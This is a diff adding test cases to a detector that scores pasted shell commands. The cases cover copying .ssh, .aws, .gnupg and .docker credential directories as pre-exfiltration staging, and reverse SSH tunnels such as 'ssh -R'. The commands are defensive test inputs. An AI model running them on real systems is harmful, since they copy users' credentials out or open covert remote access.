@@ -9257,6 +9257,22 @@ jcheck "text import-duty noun benign" 'd["score"] < 30' text 'import duty on for
 jcheck "text push-notification benign" 'd["score"] < 15' text 'push notifications are enabled'
 jcheck "text held-inspection benign" 'd["score"] < 20' text 'held for inspection by the committee'
 
+# Paste credential-dir bulk copy + ssh-arm .ssh fix (cycle 510):
+# cp/scp/rsync/tar/zip/mv of .ssh/.aws/.gnupg/.kube/.docker dirs is
+# deliberate pre-exfil staging detection; '.ssh' paths no longer
+# cross-fire the ssh-tunnel arm via a copy tool's '-r' flag.
+jcheck "paste cp-r .ssh staging" 'd["score"] == 45' paste 'cp -r ~/.ssh /mnt/usb'
+jcheck "paste rsync .aws staging" 'd["score"] == 45' paste 'rsync -av ~/.aws e:/x'
+jcheck "paste scp .aws staging" 'd["score"] == 45' paste 'scp -r ~/.aws e:/x'
+jcheck "paste tar .aws staging" 'd["score"] == 45' paste 'tar czf b.tgz .aws'
+jcheck "paste mv .gnupg staging" 'd["score"] == 45' paste 'mv ~/.gnupg /tmp/x'
+jcheck "paste xcopy .docker staging" 'd["score"] == 45' paste 'robocopy .docker x'
+jcheck "paste cp benign clean" 'd["score"] < 15' paste 'cp file /tmp/x'
+jcheck "paste ssh -R still flagged" 'd["score"] == 55' paste 'ssh -R 4444:localhost:22 u@e'
+jcheck "paste autossh -R flagged" 'd["score"] == 55' paste 'autossh -M 0 -R 2222 x'
+jcheck "paste ssh -Nf flagged" 'd["score"] == 55' paste 'ssh -Nf -R 2222 x'
+
+
 
 # Clipboard (cycle 507): invalid look-alike swap — pasted string fails
 # address format but shares both ends with the copied address.
